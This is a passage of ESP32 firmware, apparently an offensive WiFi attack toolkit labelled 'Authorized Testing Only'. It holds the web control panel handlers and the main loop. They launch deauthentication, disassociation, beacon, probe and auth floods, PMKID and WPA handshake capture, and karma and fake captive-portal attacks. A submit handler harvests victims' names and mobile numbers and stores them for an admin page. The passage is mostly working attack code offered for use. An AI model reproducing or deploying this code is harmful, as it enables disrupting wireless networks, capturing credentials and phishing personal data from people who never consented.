  void handleHandshakeStop() { Attacks::stopHandshake(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  
  void handleHandshakePage() {
    state.server->send(200, "text/html", HTML::getHandshakePage());
  }
  
  void handleHandshakeClear() {
    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) state.handshakes[i] = HandshakeData();
    state.handshakeCount = 0;
    state.server->sendHeader("Location", "/handshake");
    state.server->send(302);
  }
  
  void handlePortalStart() {
    String fakeSSID = state.server->arg("s");
    if (fakeSSID.length() == 0) fakeSSID = "Free_WiFi";
    if (Attacks::startPortal(fakeSSID)) { state.server->sendHeader("Location", "/"); state.server->send(302); }
    else state.server->send(500);
  }
  void handlePortalStop() { Attacks::stopPortal(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  void handleSnifferStart() { Attacks::startSniffer(state.server->arg("c").toInt()); state.server->sendHeader("Location", "/"); state.server->send(302); }
  void handleSnifferStop() { Attacks::stopSniffer(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  
  void handleBeaconStart() {
    String ssid = state.server->arg("s");
    int channel = state.server->arg("c").toInt();
    if (channel == 0) channel = 1; if (ssid.length() == 0) ssid = "FakeAP";
    Attacks::startBeaconFlood(channel, ssid);
    state.server->sendHeader("Location", "/"); state.server->send(302);
  }
  void handleBeaconStop() { Attacks::stopBeaconFlood(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  
  void handleProbeStart() {
    String ssid = state.server->arg("s");
    int channel = state.server->arg("c").toInt();
    if (channel == 0) channel = 1; if (ssid.length() == 0) ssid = "TargetNetwork";
    Attacks::startProbeFlood(channel, ssid);
    state.server->sendHeader("Location", "/"); state.server->send(302);
  }
  void handleProbeStop() { Attacks::stopProbeFlood(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  
  void handleAuthStart() {
    String mac = state.server->arg("m");
    int channel = state.server->arg("c").toInt();
    if (mac.length() == 0) { state.server->send(400); return; }
    if (Attacks::startAuthFlood(mac, channel)) { state.server->sendHeader("Location", "/"); state.server->send(302); }
    else state.server->send(400);
  }
  void handleAuthStop() { Attacks::stopAuthFlood(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  
  void handleKarmaStart() {
    String ssid = state.server->arg("s");
    if (ssid.length() == 0) ssid = "Free_WiFi";
    if (Attacks::startKarma(ssid)) { state.server->sendHeader("Location", "/"); state.server->send(302); }
    else state.server->send(500);
  }
  void handleKarmaStop() { Attacks::stopKarma(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  
  void handleStopAll() { Attacks::stopAllAttacks(); state.server->sendHeader("Location", "/"); state.server->send(302); }
  
  void handleSubmit() {
    String name = state.server->arg("name");
    String mobile = state.server->arg("mobile");
    name = Utils::sanitizeString(name);
    mobile = Utils::sanitizeString(mobile);
    
    if (name.length() == 0 || mobile.length() == 0) { state.server->send(400); return; }
    
    if (state.credentialCount < Config::MAX_CREDENTIALS) {
      String timestamp = Utils::formatUptime(millis() - state.startTime);
      state.credentials[state.credentialCount] = "[" + timestamp + "] " + name + " : " + mobile;
      state.credentialCount++;
      state.credentialData = "Active - Captured: " + String(state.credentialCount);
    }
    state.server->send(200, "text/html", HTML::getSuccessPage());
  }
  
  void handleCredentials() {
    state.server->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + ":" + String(Config::ADMIN_PORT) + "/admin");
    state.server->send(302);
  }
  
  void handleClear() {
    state.scanData = "Click 'WiFi Scan'"; state.hostData = "Click 'Host Scan'";
    state.deauthCount = 0; state.disassocCount = 0; state.assocCount = 0; 
    state.packetCount = 0; state.eapolCount = 0;
    state.handshakeCount = 0; state.beaconCount = 0; state.probeCount = 0; state.authCount = 0; state.karmaCount = 0;
    state.mgmtCount = 0; state.ctrlCount = 0; state.dataCount = 0;
    state.totalRequests = 0; state.errorCount = 0;
    state.server->sendHeader("Location", "/"); state.server->send(302);
  }
  
  void handleReboot() {
    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><style>";
    html += "body{background:#c0392b;color:#fff;text-align:center;padding:50px;font-family:Arial;margin:0}";
    html += "h1{font-size:2.5em} .spinner{border:8px solid #f3f3f3;border-top:8px solid #fff;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:30px auto}";
    html += "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}";
    html += "</style></head><body><h1> Rebooting</h1><div class='spinner'></div></body></html>";
    state.server->send(200, "text/html", html);
    delay(1000); ESP.restart();
  }
  
  void handleNotFound() {
    if (state.portalActive) { state.server->sendHeader("Location", "/"); state.server->send(302); }
    else state.server->send(404, "text/plain", "404");
  }
}

void setup() {
  Serial.begin(115200); delay(100);
  pinMode(Config::LED_PIN, OUTPUT); digitalWrite(Config::LED_PIN, HIGH);
  
  Serial.println("\n\n  ESP32 SECURITY SUITE v2.4  ");
  Serial.println("  Authorized Testing Only\n");
  
  state.startTime = millis();
  state.scanData = "Click 'WiFi Scan'";
  state.hostData = "Click 'Host Scan'";
  state.monitorData = "Start Analysis";
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(Config::AP_SSID, Config::AP_PASSWORD);
  delay(100);
  
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_max_tx_power(84);
  
  IPAddress ip = WiFi.softAPIP();
  Serial.println("AP Started: " + String(Config::AP_SSID));
  Serial.println("IP: " + ip.toString());
  
  state.server = new WebServer(Config::WEB_PORT);
  state.adminServer = new WebServer(Config::ADMIN_PORT);
  state.dnsServer = new DNSServer();
  
  state.server->on("/", Handlers::handleRoot);
  state.server->on("/s", Handlers::handleScan);
  state.server->on("/h", Handlers::handleHosts);
  state.server->on("/d", Handlers::handleDeauthStart);
  state.server->on("/ds", Handlers::handleDeauthStop);
  state.server->on("/di", Handlers::handleDisassocStart);
  state.server->on("/dss", Handlers::handleDisassocStop);
  state.server->on("/as", Handlers::handleAssocStart);
  state.server->on("/ass", Handlers::handleAssocStop);
  state.server->on("/p", Handlers::handlePMKIDStart);
  state.server->on("/ps", Handlers::handlePMKIDStop);
  state.server->on("/hsh", Handlers::handleHandshakeStart);
  state.server->on("/hs", Handlers::handleHandshakeStop);
  state.server->on("/handshake", Handlers::handleHandshakePage);
  state.server->on("/handshake/clear", Handlers::handleHandshakeClear);
  state.server->on("/e", Handlers::handlePortalStart);
  state.server->on("/es", Handlers::handlePortalStop);
  state.server->on("/n", Handlers::handleSnifferStart);
  state.server->on("/ns", Handlers::handleSnifferStop);
  state.server->on("/b", Handlers::handleBeaconStart);
  state.server->on("/bs", Handlers::handleBeaconStop);
  state.server->on("/pr", Handlers::handleProbeStart);
  state.server->on("/prs", Handlers::handleProbeStop);
  state.server->on("/au", Handlers::handleAuthStart);
  state.server->on("/aus", Handlers::handleAuthStop);
  state.server->on("/k", Handlers::handleKarmaStart);
  state.server->on("/ks", Handlers::handleKarmaStop);
  state.server->on("/m", Handlers::handleMonitorStart);
  state.server->on("/ms", Handlers::handleMonitorStop);
  state.server->on("/c", Handlers::handleCredentials);
  state.server->on("/x", Handlers::handleClear);
  state.server->on("/stop", Handlers::handleStopAll);
  state.server->on("/r", Handlers::handleReboot);
  state.server->on("/submit", HTTP_POST, Handlers::handleSubmit);
  state.server->onNotFound(Handlers::handleNotFound);
  
  state.adminServer->on("/", AdminHandlers::handleAdminRoot);
  state.adminServer->on("/admin", AdminHandlers::handleAdminRoot);
  state.adminServer->on("/admin/json", AdminHandlers::handleAdminJSON);
  state.adminServer->on("/admin/clear", AdminHandlers::handleAdminClear);
  state.adminServer->onNotFound(AdminHandlers::handleAdminNotFound);
  
  state.server->begin();
  state.adminServer->begin();
  Serial.println("System Ready.");
}

void loop() {
  if (state.server) state.server->handleClient();
  if (state.adminServer) state.adminServer->handleClient();
  if (state.dnsActive && state.dnsServer) state.dnsServer->processNextRequest();
  
  if (state.hopperActive && millis() - state.lastHop >= Config::HOP_INTERVAL) {
    state.hopChannel = (state.hopChannel % 13) + 1;
    esp_wifi_set_channel(state.hopChannel, WIFI_SECOND_CHAN_NONE);
    state.lastHop = millis();
  }

  if (state.deauthActive && millis() - state.lastDeauth >= Config::DEAUTH_INTERVAL) {
    Attacks::sendDeauthPacket(); state.lastDeauth = millis();
  }
  if (state.disassocActive && millis() - state.lastDisassoc >= Config::DISASSOC_INTERVAL) {
    Attacks::sendDisassocPacket(); state.lastDisassoc = millis();
  }
  if (state.assocFloodActive && millis() - state.lastAssoc >= Config::ASSOC_INTERVAL) {
    Attacks::sendAssocPacket(); state.lastAssoc = millis();
  }
  if (state.beaconFloodActive && millis() - state.lastBeacon >= Config::BEACON_INTERVAL) {
    Attacks::sendBeaconPacket(); state.lastBeacon = millis();
  }
  if (state.probeFloodActive && millis() - state.lastProbe >= Config::PROBE_INTERVAL) {
    Attacks::sendProbePacket(); state.lastProbe = millis();
  }
  if (state.authFloodActive && millis() - state.lastAuth >= Config::AUTH_INTERVAL) {
    Attacks::sendAuthPacket(); state.lastAuth = millis();
  }
  
  if (state.monitorActive) {
    if (millis() - state.lastMonitorUpdate >= 1000) {
      state.packetsPerSecond = state.packetCount; 
      state.monitorData = state.hopperActive ? ("Hopping CH " + String(state.hopChannel)) : ("CH " + String(state.targetChannel));
      state.lastMonitorUpdate = millis();
    }
  }
  
  if (state.pmkidActive && millis() - state.lastPMKIDCheck > Config::PMKID_TIMEOUT) {
    if (state.eapolCount == 0) {
      state.targetChannel = (state.targetChannel % 13) + 1;
      esp_wifi_set_channel(state.targetChannel, WIFI_SECOND_CHAN_NONE);
      state.pmkidData = "Listening on CH " + String(state.targetChannel);
    }
    state.lastPMKIDCheck = millis();
  }
  
  if (state.deauthActive || state.disassocActive || state.assocFloodActive || state.pmkidActive || state.portalActive || state.snifferActive ||
      state.handshakeActive || state.beaconFloodActive || state.probeFloodActive || 
      state.authFloodActive || state.karmaActive || state.monitorActive) {
    if (millis() - state.lastBlink >= Config::LED_BLINK_INTERVAL) {
      digitalWrite(Config::LED_PIN, !digitalRead(Config::LED_PIN));
      state.lastBlink = millis();
    }
  } else {
    digitalWrite(Config::LED_PIN, HIGH); 
  }
  
  if (millis() - state.lastWatchdog >= Config::WATCHDOG_TIMEOUT) Utils::resetWatchdog();
  delay(1);
}
